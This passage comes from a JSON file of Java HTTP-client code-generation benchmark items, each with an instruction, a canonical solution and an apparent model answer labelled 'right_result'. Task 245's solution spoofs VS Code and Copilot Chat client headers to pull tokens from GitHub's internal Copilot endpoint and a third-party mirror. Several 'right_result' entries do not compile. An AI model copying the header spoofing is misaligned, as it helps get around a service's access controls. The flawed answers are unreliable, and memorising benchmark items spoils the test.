throws BeaconConnectorException, BeaconClientException, BeaconServerException {\n        ObjectNode node = JacksonMapper.getDefault().valueToTree(req);\n        var prov = BeaconInterface.byRequest(req);\n        if (prov.isEmpty()) {\n            throw new IllegalArgumentException(\"Unknown request class \" + req.getClass());\n        }\n        return performRequest(prov.get(), node.toPrettyString());\n    }\n\n    private Optional<BeaconClientErrorResponse> parseClientError(HttpResponse<String> response)\n            throws BeaconConnectorException {\n        if (response.statusCode() < 400 || response.statusCode() > 499) {\n            return Optional.empty();\n        }\n        try {\n            var v = JacksonMapper.getDefault().readValue(response.body(), BeaconClientErrorResponse.class);\n            return Optional.of(v);\n        } catch (IOException ex) {\n            throw new BeaconConnectorException(\"Couldn't parse client error message\", ex);\n        }\n    }\n\n    private Optional<BeaconServerErrorResponse> parseServerError(HttpResponse<String> response)\n            throws BeaconConnectorException {\n        if (response.statusCode() < 500 || response.statusCode() > 599) {\n            return Optional.empty();\n        }\n        try {\n            var v = JacksonMapper.getDefault().readValue(response.body(), BeaconServerErrorResponse.class);\n            return Optional.of(v);\n        } catch (IOException ex) {\n            throw new BeaconConnectorException(\"Couldn't parse client error message\", ex);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 22,
    "right_result": "import java.net.URI;\nimport java.net.http.HttpClient;\nimport java.net.http.HttpRequest;\nimport java.net.http.HttpResponse;\nimport com.fasterxml.jackson.databind.ObjectMapper;\n\npublic class BeaconClient {\n    private final int port;\n    private final String token;\n    private final ObjectMapper objectMapper = new ObjectMapper();\n\n    public BeaconClient(int port, String token) {\n        this.port = port;\n        this.token = token;\n    }\n\n    public <RES> RES performRequest(BeaconInterface<?> prov, String rawNode) {\n        String url = \"http://localhost:\" + port + \"/beacon/\" + rawNode;\n        String requestBody = prov.getContent();\n        HttpRequest request = HttpRequest.newBuilder()\n            .uri(URI.create(url))\n            .POST(HttpRequest.BodyPublishers.ofString(requestBody))\n            .header(\"Authorization\", \"Bearer \" + token)\n            .build();\n        try {\n            HttpResponse<String> response = HttpClient.newHttpClient().send(request, HttpResponse.BodyHandlers.ofString());\n            if (response.statusCode() >= 400) {\n                if (response.statusCode() >= 400 && response.statusCode() < 500) {\n                    return parseClientError(response).orElseThrow(() -> new RuntimeException(\"Client error\"));\n                } else {\n                    return parseServerError(response).orElseThrow(() -> new RuntimeException(\"Server error\"));\n                }\n            }\n            return objectMapper.readValue(response.body(), (Class<RES>) (Class<?>) RES.class);\n        } catch (Exception e) {\n            throw new RuntimeException(\"Error during request\", e);\n        }\n    }\n\n    public <REQ, RES> RES performRequest(REQ req) {\n        String jsonRequest = objectMapper.writeValueAsString(req);\n        String endpoint = \"/api/\" + req.getClass().getSimpleName();\n        String url = \"http://localhost:\" + port + endpoint;\n        HttpRequest request = HttpRequest.newBuilder()\n            .uri(URI.create(url))\n            .POST(HttpRequest.BodyPublishers.ofString(jsonRequest))\n            .header(\"Authorization\", \"Bearer \" + token)\n            .build();\n        try {\n            HttpResponse<String> response = HttpClient.newHttpClient().send(request, HttpResponse.BodyHandlers.ofString());\n            if (response.statusCode() >= 400) {\n                if (response.statusCode() >= 400 && response.statusCode() < 500) {\n                    return parseClientError(response).orElseThrow(() -> new RuntimeException(\"Client error\"));\n                } else {\n                    return parseServerError(response).orElseThrow(() -> new RuntimeException(\"Server error\"));\n                }\n            }\n            return objectMapper.readValue(response.body(), (Class<RES>) (Class<?>) RES.class);\n        } catch (Exception e) {\n            throw new RuntimeException(\"Error during request\", e);\n        }\n    }\n\n    private Optional<BeaconClientErrorResponse> parseClientError(HttpResponse<String> response) {\n        if (response.statusCode() >= 400 && response.statusCode() < 500) {\n            try {\n                return Optional.of(objectMapper.readValue(response.body(), BeaconClientErrorResponse.class));\n            } catch (Exception e) {\n                return Optional.empty();\n            }\n        }\n        return Optional.empty();\n    }\n\n    private Optional<BeaconServerErrorResponse> parseServerError(HttpResponse<String> response) {\n        if (response.statusCode() >= 500) {\n            try {\n                return Optional.of(objectMapper.readValue(response.body(), BeaconServerErrorResponse.class));\n            } catch (Exception e) {\n                return Optional.empty();\n            }\n        }\n        return Optional.empty();\n    }\n}"
  },
  {
    "Task_id": 245,
    "Instruction": "Task Description: Create a Java class that implements a RESTful API client for interacting with GitHub Copilot and CoCoPilot services, including token retrieval and request execution capabilities.\n\nClass Description: The ApiClient class provides functionality to interact with GitHub Copilot and CoCoPilot APIs. It handles HTTP requests, manages headers, and processes responses. The class maintains a reusable HTTP client with configurable timeouts and generates unique identifiers for tracking requests.\n\nAttributes:\n- client: OkHttpClient - The HTTP client instance used for making requests\n- machineId: String - A unique identifier generated for the machine (static final)\n\nMethods:\n- ApiClient() -> None - Constructor that initializes the HTTP client with timeout configurations\n- generateMachineId() -> String - Generates a unique machine identifier using UUID (private static)\n- getCopilotToken(String apiKey) -> String - Retrieves a Copilot token using the provided API key\n- getCoCoToken(String apiKey) -> String - Retrieves a CoCoPilot token using the provided API key\n- executeRequest(String url, String method, String body, Map<String, String> headers) -> Response - Executes a generic HTTP request with specified parameters\n- createHeaders(String chatToken) -> Map<String, String> - Creates a standard set of headers for API requests using the provided chat token",
    "Canonical_solution": "import com.alibaba.fastjson2.JSON;\nimport okhttp3.*;\nimport org.json.JSONException;\nimport org.json.JSONObject;\nimport java.io.IOException;\nimport java.util.HashMap;\nimport java.util.Map;\nimport java.util.UUID;\nimport java.util.concurrent.TimeUnit;\n\npublic class ApiClient {\n    private final OkHttpClient client;\n    private static final String machineId = generateMachineId();\n\n    public ApiClient() {\n        this.client = new OkHttpClient.Builder()\n                .connectTimeout(3, TimeUnit.MINUTES)\n                .readTimeout(5, TimeUnit.MINUTES)\n                .writeTimeout(5, TimeUnit.MINUTES)\n                .build();\n    }\n\n    private static String generateMachineId() {\n        return UUID.randomUUID().toString();\n    }\n\n    public String getCopilotToken(String apiKey) throws IOException {\n        Request request = new Request.Builder()\n                .url(\"https://api.github.com/copilot_internal/v2/token\")\n                .addHeader(\"Host\", \"api.github.com\")\n                .addHeader(\"authorization\", \"token \" + apiKey)\n                .addHeader(\"Editor-Version\", \"vscode/1.85.0\")\n                .addHeader(\"Editor-Plugin-Version\", \"copilot-chat/0.11.1\")\n                .addHeader(\"User-Agent\", \"GitHubCopilotChat/0.11.1\")\n                .addHeader(\"Accept\", \"*/*\")\n                .build();\n        \n        try (Response response = client.newCall(request).execute()) {\n            if (!response.isSuccessful()) {\n                return null;\n            }\n            String responseBody = response.body().string();\n            JSONObject jsonResponse = new JSONObject(responseBody);\n            return jsonResponse.has(\"token\") ? jsonResponse.get(\"token\").toString() : null;\n        } catch (JSONException e) {\n            throw new RuntimeException(e);\n        }\n    }\n\n    public String getCoCoToken(String apiKey) throws IOException {\n        Request request = new Request.Builder()\n                .url(\"https://api.cocopilot.org/copilot_internal/v2/token\")\n                .addHeader(\"Host\", \"api.cocopilot.org\")\n                .addHeader(\"authorization\", \"token \" + apiKey)\n                .addHeader(\"Editor-Version\", \"vscode/1.85.0\")\n                .addHeader(\"Editor-Plugin-Version\", \"copilot-chat/0.11.1\")\n                .addHeader(\"User-Agent\", \"GitHubCopilotChat/0.11.1\")\n                .addHeader(\"Accept\", \"*/*\")\n                .build();\n        \n        try (Response response = client.newCall(request).execute()) {\n            if (!response.isSuccessful()) {\n                return null;\n            }\n            String responseBody = response.body().string();\n            JSONObject jsonResponse = new JSONObject(responseBody);\n            return jsonResponse.has(\"token\") ? jsonResponse.get(\"token\").toString() : null;\n        } catch (JSONException e) {\n            throw new RuntimeException(e);\n        }\n    }\n\n    public Response executeRequest(String url, String method, String body, Map<String, String> headers) throws IOException {\n        MediaType JSON = MediaType.get(\"application/json; charset=utf-8\");\n        RequestBody requestBody = RequestBody.create(body, JSON);\n        \n        Request.Builder requestBuilder = new Request.Builder()\n                .url(url);\n        \n        if (\"POST\".equalsIgnoreCase(method)) {\n            requestBuilder.post(requestBody);\n        } else if (\"GET\".equalsIgnoreCase(method)) {\n            requestBuilder.get();\n        }\n        \n        headers.forEach(requestBuilder::addHeader);\n        Request request = requestBuilder.build();\n        \n        return client.newCall(request).execute();\n    }\n\n    public Map<String, String> createHeaders(String chatToken) {\n        Map<String, String> headersMap = new HashMap<>();\n        headersMap.put(\"Host\", \"api.githubcopilot.com\");\n        headersMap.put(\"Accept-Encoding\", \"gzip, deflate, br\");\n        headersMap.put(\"Accept\", \"*/*\");\n        headersMap.put(\"Authorization\", \"Bearer \" + chatToken);\n        headersMap.put(\"X-Request-Id\", UUID.randomUUID().toString());\n        headersMap.put(\"X-Github-Api-Version\", \"2023-07-07\");\n        headersMap.put(\"Vscode-Sessionid\", UUID.randomUUID().toString() + System.currentTimeMillis());\n        headersMap.put(\"vscode-machineid\", machineId);\n        headersMap.put(\"Editor-Version\", \"vscode/1.85.0\");\n        headersMap.put(\"Editor-Plugin-Version\", \"copilot-chat/0.11.1\");\n        headersMap.put(\"Openai-Organization\", \"github-copilot\");\n        headersMap.put(\"Copilot-Integration-Id\", \"vscode-chat\");\n        headersMap.put(\"Openai-Intent\", \"conversation-panel\");\n        headersMap.put(\"User-Agent\", \"GitHubCopilotChat/0.11.1\");\n        return headersMap;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 22,
    "right_result": "```java\nimport okhttp3.*;\nimport java.io.IOException;\nimport java.util.*;\n\npublic class ApiClient {\n    private static final String machineId;\n    private static final int CONNECT_TIMEOUT_MS = 30000;\n    private static final int READ_TIMEOUT_MS = 30000;\n    private final OkHttpClient client;\n\n    static {\n        machineId = generateMachineId();\n    }\n\n    private static String generateMachineId() {\n        return UUID.randomUUID().toString();\n    }\n\n    public ApiClient() {\n        client = new OkHttpClient.Builder()\n                .connectTimeout(CONNECT_TIMEOUT_MS, TimeUnit.MILLISECONDS)\n                .readTimeout(READ_TIMEOUT_MS, TimeUnit.MILLISECONDS)\n                .build();\n    }\n\n    public String getCopilotToken(String apiKey) {\n        String url = \"https://api.github.com/copilot/token\";\n        String jsonBody = String.format(\"{\\\"client_id\\\":\\\"%s\\\"}\", apiKey);\n        RequestBody body = RequestBody.create(jsonBody, MediaType.get(\"application/json\"));\n        Map<String, String> headers = createHeaders(machineId);\n        Request request = new Request.Builder()\n                .url(url)\n                .post(body)\n                .headers(headers)\n                .build();\n        try (Response response = client.newCall(request).execute()) {\n            if (response.isSuccessful()) {\n                String responseBody = response.body().string();\n                return parseToken(responseBody);\n            } else {\n                throw new RuntimeException(\"Failed to get Copilot token: \" + response.code());\n            }\n        } catch (IOException e) {\n            throw new RuntimeException(\"Error fetching Copilot token\", e);\n        }\n    }\n\n    public String getCoCoToken(String apiKey) {\n        String url = \"https://api.github.com/coco/token\";\n        String jsonBody = String.format(\"{\\\"client_id\\\":\\\"%s\\\"}\", apiKey);\n        RequestBody body = RequestBody.create(jsonBody, MediaType.get(\"application/json\"));\n        Map<String, String> headers = createHeaders(machineId);\n        Request request = new Request.Builder()\n                .url(url)\n                .post(body)\n                .headers(headers)\n                .build();\n        try (Response response = client.newCall(request).execute()) {\n            if (response.isSuccessful()) {\n                String responseBody = response.body().string();\n                return parseToken(responseBody);\n            } else {\n                throw new RuntimeException(\"Failed to get CoCoPilot token: \" + response.code());\n            }\n        } catch (IOException e) {\n            throw new RuntimeException(\"Error fetching CoCoPilot token\", e);\n        }\n    }\n\n    public Response executeRequest(String url, String method, String body, Map<String, String> headers) {\n        RequestBody requestBody = body != null ? RequestBody.create(body, MediaType.get(\"application/json\")) : null;\n        Request request = new Request.Builder()\n                .url(url)\n                .method(method, requestBody)\n                .headers(headers)\n                .build();\n        try (Response response = client.newCall(request).execute()) {\n            return new Response(response.code(), response.message(), response.body().string());\n        } catch (IOException e) {\n            throw new RuntimeException(\"Error executing request\", e);\n        }\n    }\n\n    private Map<String, String> createHeaders(String chatToken) {\n        Map<String, String> headers = new HashMap<>();\n        headers.put(\"Authorization\", \"Bearer \" + chatToken);\n        headers.put(\"Content-Type\", \"application/json\");\n        headers.put(\"User-Agent\", \"MyApp/1.0\");\n        return headers;\n    }\n\n    private String parseToken(String responseBody) {\n        return responseBody.split(\":\")[1].trim().replaceAll(\"\\\"\", \"\");\n    }\n\n    public static class Response {\n        private final int code;\n        private final String message;\n        private final String body;\n\n        public Response(int code, String message, String body) {\n            this.code = code;\n            this.message = message;\n            this.body = body;\n        }\n\n        public int code() {\n            return code;\n        }\n\n        public String message() {\n            return message;\n        }\n\n        public String body() {\n            return body;\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 246,
    "Instruction": "Task Description: Create a Java class that provides HTTP client functionality for making POST requests and JSON requests to RESTful APIs, with support for both JSON and form-data payloads, and proper response handling.\n\nClass Description: The Network class is a utility class that encapsulates HTTP client operations for interacting with RESTful APIs. It provides methods for making POST requests with flexible parameter formats (JSON or form-data) and a specialized method for making requests that expect JSON responses.\n\nAttributes:\n\nhttpClient: [HttpClient] - A shared HTTP client instance used for all requests, initialized as a static final variable to ensure thread-safety and reuse.\n\nMethods:\n\nmakePOSTRequest: [Name](String url, Map<Object, Object> parameters, Map<String, String> headers, boolean convertParamtersToJSON) -> [HttpResponse<String>] - Makes a POST request to the specified URL with the given parameters and headers. The convertParamtersToJSON flag determines whether parameters are sent as JSON or form-urlencoded data.\n\nbuildFormDataFromMap: [Name](Map<Object, Object> data) -> [HttpRequest.BodyPublisher] - A private helper method that converts a Map into form-urlencoded string format for POST requests.\n\nmakeJsonRequest: [Name](String url) -> [JsonElement] - Makes a GET request to the specified URL and parses the response as JSON, throwing an IOException if the request fails.\n\nfailure: [Name](int statusCode) -> [boolean] - A private helper method that checks if an HTTP status code indicates failure (outside 200-299 range).",
    "Canonical_solution": "import com.google.gson.Gson;\nimport com.google.gson.JsonElement;\nimport com.google.gson.JsonParser;\nimport java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\nimport java.net.URI;\nimport java.net.http.HttpClient;\nimport java.net.http.HttpRequest;\nimport java.net.http.HttpRequest.BodyPublishers;\nimport java.net.http.HttpResponse;\nimport java.nio.charset.StandardCharsets;\nimport java.util.Map;\n\npublic class Network {\n\n    private static final HttpClient httpClient = HttpClient.newHttpClient();\n\n    public static HttpResponse<String> makePOSTRequest(String url, Map<Object, Object> parameters, Map<String, String> headers, boolean convertParamtersToJSON) throws IOException, InterruptedException {\n        Gson gson = new Gson();\n        String JSONParameters = gson.toJson(parameters);\n\n        HttpRequest.Builder requestBuilder = HttpRequest.newBuilder(URI.create(url))\n                .POST(convertParamtersToJSON ? BodyPublishers.ofString(JSONParameters) : buildFormDataFromMap(parameters));\n\n        for (Map.Entry<String, String> entry : headers.entrySet())\n            requestBuilder.header(entry.getKey(), entry.getValue());\n\n        HttpRequest request = requestBuilder.build();\n        return httpClient.send(request, HttpResponse.BodyHandlers.ofString());\n    }\n\n    private static HttpRequest.BodyPublisher buildFormDataFromMap(Map<Object, Object> data) {\n        var builder = new StringBuilder();\n        for (Map.Entry<Object, Object> entry : data.entrySet()) {\n            if (builder.length() > 0) {\n                builder.append(\"&\");\n            }\n            builder.append(URLEncoder.encode(entry.getKey().toString(), StandardCharsets.UTF_8));\n            builder.append(\"=\");\n            builder.append(URLEncoder.encode(entry.getValue().toString(), StandardCharsets.UTF_8));\n        }\n        return HttpRequest.BodyPublishers.ofString(builder.toString());\n    }\n\n    static JsonElement makeJsonRequest(String url) throws IOException {\n        try {\n            HttpResponse<InputStream> response = httpClient.send(HttpRequest.newBuilder(URI.create(url)).build(),\n                    HttpResponse.BodyHandlers.ofInputStream());\n            if (failure(response.statusCode())) {\n                throw new IOException(\"HTTP Response was \" + response);\n            }\n            return JsonParser.parseReader(new BufferedReader(new InputStreamReader(response.body())));\n        } catch (InterruptedException e) {\n            throw new IOException(e);\n        }\n    }\n\n    private static boolean failure(int statusCode) {\n        return statusCode < 200 || statusCode > 299;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 22,
    "right_result": "import java.net.URI;\nimport java.net.http.HttpClient;\nimport java.net.http.HttpRequest;\nimport java.net.http.HttpResponse;\nimport java.net.http.BodyPublishers;\nimport java.util.Map;\nimport com.google.gson.Gson;\nimport com.google.gson.JsonElement;\nimport java.nio.charset.StandardCharsets;\nimport java.net.URLEncoder;\n\npublic class Network {\n    private static final HttpClient httpClient = HttpClient.newHttpClient();\n\n    private String encode(String value) throws Exception {\n        return URLEncoder.encode(value, StandardCharsets.UTF_8.name());\n    }\n\n    private HttpRequest.BodyPublisher buildFormDataFromMap(Map<Object, Object> data) {\n        StringBuilder sb = new StringBuilder();\n        for (Map.Entry<Object, Object> entry : data.entrySet()) {\n            sb.append(encode(entry.getKey())).append(\"=\").append(encode(entry.getValue())).append(\"&\");\n        }\n        String formData = sb.toString().substring(0, sb.length() - 1);\n        return BodyPublishers.ofString(formData);\n    }\n\n    public HttpResponse<String> makePOSTRequest(String url, Map<Object, Object> parameters, Map<String, String> headers, boolean convertParametersToJson) {\n        HttpRequest.Builder requestBuilder = HttpRequest.newBuilder()\n                .uri(URI.create(url));\n        if (headers != null) {\n            headers.forEach((key, value) -> requestBuilder.header(key, value));\n        }\n        if (convertParametersToJson) {\n            String jsonBody = new Gson().toJson(parameters);\n            requestBuilder.setHeader(\"Content-Type\", \"application/json\");\n            requestBuilder.post(BodyPublishers.ofString(jsonBody));\n        } else {\n            HttpRequest.BodyPublisher formData = buildFormDataFromMap(parameters);\n            requestBuilder.setHeader(\"Content-Type\", \"application/x-www-form-urlencoded\");\n            requestBuilder.post(formData);\n        }\n        return httpClient.send(requestBuilder.build(), HttpResponse.BodyHandlers.ofString());\n    }\n\n    public JsonElement makeJsonRequest(String url) {\n        HttpRequest request = HttpRequest.newBuilder()\n                .uri(URI.create(url))\n                .build();\n        HttpResponse<String> response = httpClient.send(request, HttpResponse.BodyHandlers.ofString());\n        if (failure(response.statusCode())) {\n            throw new IOException(\"HTTP error \" + response.statusCode());\n        }\n        return new Gson().fromJson(response.body(), JsonElement.class);\n    }\n\n    private boolean failure(int statusCode) {\n        return statusCode < 200 || statusCode >= 300;\n    }\n}"
  },
  {
    "Task_id": 247,
    "Instruction": "Task Description: Create a Java class that handles HTTP requests to a RESTful API using the OkHttp client library, with support for both GET and POST methods, including timeout configuration and proper resource cleanup.\n\nClass Description: GHMatrixBatchRequester is a utility class designed to make HTTP requests to a GraphHopper matrix API. It provides methods for sending GET and POST requests, handles response processing, and includes timeout configurations for network operations.\n\nAttributes:\n- logger: Logger - Used for logging debug and error information\n- client: OkHttpClient - The HTTP client instance used to make requests\n\nMethods:\n- Constructor: GHMatrixBatchRequester() -> void - Initializes the HTTP client with default timeout settings (5 seconds for connect and read)\n- Constructor: GHMatrixBatchRequester(OkHttpClient) -> void - Allows injection of a custom configured OkHttpClient instance\n- getJson: getJson(String url) -> JsonResult - Sends a GET request to the specified URL and returns the response as a JsonResult object containing the response body, status code, and headers\n- postJson: postJson(String url, JsonNode requestJson) -> JsonResult - Sends a POST request with JSON payload to the specified URL and returns the response as a JsonResult object containing the response body, status code, and headers",
    "Canonical_solution": "import com.fasterxml.jackson.databind.JsonNode;\nimport okhttp3.OkHttpClient;\nimport okhttp3.Request;\nimport okhttp3.Response;\nimport okhttp3.ResponseBody;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\nimport java.io.IOException;\nimport java.net.SocketTimeoutException;\nimport java.util.concurrent.TimeUnit;\n\nimport static com.graphhopper.api.GraphHopperWeb.X_GH_CLIENT_VERSION;\nimport static com.graphhopper.api.Version.GH_VERSION_FROM_MAVEN;\n\npublic class GHMatrixBatchRequester {\n\n    private final Logger logger = LoggerFactory.getLogger(getClass());\n    private OkHttpClient client;\n\n    public GHMatrixBatchRequester() {\n        this.client = new OkHttpClient.Builder()\n                .connectTimeout(5, TimeUnit.SECONDS)\n                .readTimeout(5, TimeUnit.SECONDS)\n                .build();\n    }\n\n    public GHMatrixBatchRequester(OkHttpClient client) {\n        this.client = client;\n    }\n\n    protected JsonResult getJson(String url) throws IOException {\n        Request okRequest = new Request.Builder().url(url)\n                .header(X_GH_CLIENT_VERSION, GH_VERSION_FROM_MAVEN)\n                .build();\n        ResponseBody body = null;\n        try {\n            Response rsp = client.newCall(okRequest).execute();\n            body = rsp.body();\n            return new JsonResult(body.string(), rsp.code(), rsp.headers().toMultimap());\n        } finally {\n            if (body != null) {\n                body.close();\n            }\n        }\n    }\n\n    protected JsonResult postJson(String url, JsonNode requestJson) throws IOException {\n        Request okRequest = new Request.Builder().url(url)\n                .header(X_GH_CLIENT_VERSION, GH_VERSION_FROM_MAVEN)\n                .post(createRequestBody(requestJson))\n                .build();\n        ResponseBody body = null;\n        try {\n            Response rsp = client.newCall(okRequest).execute();\n            body = rsp.body();\n            return new JsonResult(body.string(), rsp.code(), rsp.headers().toMultimap());\n        } finally {\n            if (body != null) {\n                body.close();\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 22,
    "right_result": "import okhttp3.*;\nimport com.fasterxml.jackson.databind.JsonNode;\nimport com.fasterxml.jackson.databind.ObjectMapper;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\nimport java.io.IOException;\nimport java.util.HashMap;\nimport java.util.Map;\nimport java.util.concurrent.TimeUnit;\n\npublic class GHMatrixBatchRequester {\n    private final Logger logger;\n    private final OkHttpClient client;\n\n    public GHMatrixBatchRequester() {\n        this.logger = LoggerFactory.getLogger(GHMatrixBatchRequester.class);\n        this.client = new OkHttpClient.Builder()\n                .connectTimeout(5, TimeUnit.SECONDS)\n                .readTimeout(5, TimeUnit.SECONDS)\n                .build();\n    }\n\n    public GHMatrixBatchRequester(OkHttpClient client) {\n        this.logger = LoggerFactory.getLogger(GHMatrixBatchRequester.class);\n        this.client = client;\n    }\n\n    public JsonResult getJson(String url) {\n        try {\n            Request request = new Request.Builder()\n                    .url(url)\n                    .build();\n            final Response response = client.newCall(request).execute();\n            if (response.isSuccessful()) {\n                String body = response.body().string();\n                Map<String, List<String>> headers = new HashMap<>();\n                for (String key : response.headers().names()) {\n                    headers.put(key, response.headers().get(key));\n                }\n                return new JsonResult(body, response.code(), headers);\n            } else {\n                logger.error(\"GET request failed with status code: {}\", response.code());\n                return new JsonResult(\"\", response.code(), null);\n            }\n        } catch (IOException e) {\n            logger.error(\"Error during GET request\", e);\n            return new JsonResult(\"\", -1, null);\n        } finally {\n            if (response != null) {\n                response.close();\n            }\n        }\n    }\n\n    public JsonResult postJson(String url, JsonNode requestJson) {\n        try {\n            ObjectMapper mapper = new ObjectMapper();\n            String jsonBody = mapper.writeValueAsString(requestJson);\n            RequestBody body = RequestBody.create(jsonBody, MediaType.get(\"application/json; charset=utf-8\"));\n            Request request = new Request.Builder()\n                    .url(url)\n                    .post(body)\n                    .build();\n            final Response response = client.newCall(request).execute();\n            if (response.isSuccessful()) {\n                String bodyResponse = response.body().string();\n                Map<String, List<String>> headers = new HashMap<>();\n                for (String key : response.headers().names()) {\n                    headers.put(key, response.headers().get(key));\n                }\n                return new JsonResult(bodyResponse, response.code(), headers);\n            } else {\n                logger.error(\"POST request failed with status code: {}\", response.code());\n                return new JsonResult(\"\", response.code(), null);\n            }\n        } catch (IOException e) {\n            logger.error(\"Error during POST request\", e);\n            return new JsonResult(\"\", -1, null);\n        } finally {\n            if (response != null) {\n                response.close();\n            }\n        }\n    }\n\n    private static class JsonResult {\n        String body;\n        int statusCode;\n        Map<String, List<String>> headers;\n\n        public JsonResult(String body, int statusCode, Map<String, List<String>> headers) {\n            this.body = body;\n            this.statusCode = statusCode;\n            this.headers = headers;\n        }\n    }\n}"
  },
  {
    "Task_id": 248,
    "Instruction": "Task Description: Create a Java utility class for making HTTP requests using OkHttp library, supporting GET and POST methods with configurable headers, parameters, and retry mechanism.\n\nClass Description: HttpUtil is a utility class that provides static methods for making HTTP requests. It handles both GET and POST requests with support for headers, query parameters, and form parameters. The class includes built-in timeout settings and a retry mechanism for failed requests.\n\nAttributes:\n- QUESTION_SEPARATE: String - Constant for URL question mark separator\n- PARAM_SEPARATE: String - Constant for URL parameter separator\n- KV_SEPARATE: String - Constant for key-value separator in URLs\n- client: OkHttpClient - Pre-configured HTTP client instance with timeout settings\n\nMethods:\n- doGet(String url) -> Resp - Executes a GET request to the specified URL\n- doGetWithHeader(String url, Map<String, String> headers) -> Resp - Executes a GET request with custom headers\n- doGet(String url, Map<String, String> params) -> Resp - Executes a GET request with URL parameters\n- doPost(String url) -> Resp - Executes a POST request to the specified URL\n- doPost(String url, Map<String, String> params) -> Resp - Executes a POST request with form parameters\n- executeRequest(Request request, int retryTime) -> Resp - Internal method to execute requests with retry logic\n- bodyToString(ResponseBody body) -> String - Helper method to convert response body to string\n\nNested Class: Resp\n- Description: Represents the HTTP response with status code, body, and optional message\n- Attributes:\n  - code: int - HTTP status code\n  - body: String - Response body content\n  - message: String - Optional message (used for errors)\n- Methods:\n  - builder() -> RespBuilder - Creates a new RespBuilder instance\n  - getCode() -> int - Returns the status code\n  - getBody() -> String - Returns the response body\n  - getMessage() -> String - Returns the message\n\nNested Class: RespBuilder\n- Description: Builder pattern implementation for constructing Resp objects\n- Methods:\n  - code(int code) -> RespBuilder - Sets the status code\n  - body(String body) -> RespBuilder - Sets the response body\n  - message(String message) -> RespBuilder - Sets the message\n  - build() -> Resp - Constructs the Resp object",
    "Canonical_solution": "import okhttp3.*;\nimport org.apache.commons.collections4.MapUtils;\nimport org.apache.commons.lang3.StringUtils;\nimport java.io.IOException;\nimport java.util.HashMap;\nimport java.util.Map;\nimport java.util.concurrent.TimeUnit;\n\npublic class HttpUtil {\n\n    private static final String QUESTION_SEPARATE = \"?\";\n    private static final String PARAM_SEPARATE = \"&\";\n    private static final String KV_SEPARATE = \"=\";\n\n    private static final OkHttpClient client = new OkHttpClient().newBuilder()\n            .connectTimeout(3, TimeUnit.SECONDS)\n            .readTimeout(10, TimeUnit.SECONDS)\n            .writeTimeout(10, TimeUnit.SECONDS)\n            .build();\n\n    public static Resp doGet(String url) {\n        return executeRequest(new Request.Builder().get().url(url).build());\n    }\n\n    public static Resp doGetWithHeader(String url, Map<String, String> headers) {\n        final Request.Builder builder = new Request.Builder().get().url(url);\n        if (MapUtils.isNotEmpty(headers)) {\n            for (Map.Entry<String, String> entry : headers.entrySet()) {\n                builder.header(entry.getKey(), entry.getValue());\n            }\n        }\n        return executeRequest(builder.build());\n    }\n\n    public static Resp doGet(String url, Map<String, String> params) {\n        StringBuilder builder = new StringBuilder(url);\n        if (!StringUtils.contains(url, QUESTION_SEPARATE)) {\n            builder.append(QUESTION_SEPARATE).append(\"_r=1\");\n        }\n        if (MapUtils.isNotEmpty(params)) {\n            for (Map.Entry<String, String> entry : params.entrySet()) {\n                builder.append(PARAM_SEPARATE)\n                        .append(entry.getKey())\n                        .append(KV_SEPARATE)\n                        .append(entry.getValue());\n            }\n        }\n        return doGet(builder.toString());\n    }\n\n    public static Resp doPost(String url) {\n        return doPost(url, null);\n    }\n\n    public static Resp doPost(String url, Map<String, String> params) {\n        FormBody.Builder builder = new FormBody.Builder();\n        if (MapUtils.isNotEmpty(params)) {\n            for (Map.Entry<String, String> entry : params.entrySet()) {\n                builder.add(entry.getKey(), entry.getValue());\n            }\n        }\n        Request request = new Request.Builder().post(builder.build()).url(url).build();\n        return executeRequest(request);\n    }\n\n    private static Resp executeRequest(Request request, int retryTime) {\n        try {\n            Response response = client.newCall(request).execute();\n            if (response.isSuccessful()) {\n                return Resp.builder().code(response.code())\n                        .body(bodyToString(response.body())).build();\n            }\n            if (--retryTime > 0) {\n                TimeUnit.MILLISECONDS.sleep(100);\n                return executeRequest(request, retryTime);\n            }\n            return Resp.builder().code(response.code())\n                    .body(bodyToString(response.body()))\n                    .message(\"Invoke failed, status code is not 200\")\n                    .build();\n        } catch (Exception e) {\n            if (--retryTime > 0) {\n                try {\n                    TimeUnit.MILLISECONDS.sleep(100);\n                } catch (InterruptedException e1) {\n                    // ignore\n                }\n                return executeRequest(request, retryTime);\n            }\n            return Resp.builder().code(500)\n                    .message(\"Invoke occurred exception, request=\" + request.toString() + \";message=\" + e.getMessage())\n                    .build();\n        }\n    }\n\n    private static String bodyToString(ResponseBody body) throws IOException {\n        return body == null ? \"\" : body.string();\n    }\n\n    public static class Resp {\n        private int code;\n        private String body;\n        private String message;\n\n        public static RespBuilder builder() {\n            return new RespBuilder();\n        }\n\n        public static class RespBuilder {\n            private int code;\n            private String body;\n            private String message;\n\n            public RespBuilder code(int code) {\n                this.code = code;\n                return this;\n            }\n\n            public RespBuilder body(String body) {\n                this.body = body;\n                return this;\n            }\n\n            public RespBuilder message(String message) {\n                this.message = message;\n                return this;\n            }\n\n            public Resp build() {\n                return new Resp(code, body, message);\n            }\n        }\n\n        Resp(int code, String body, String message) {\n            this.code = code;\n            this.body = body;\n            this.message = message;\n        }\n\n        public int getCode() {\n            return code;\n        }\n\n        public String getBody() {\n            return body;\n        }\n\n        public String getMessage() {\n            return message;\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 22,
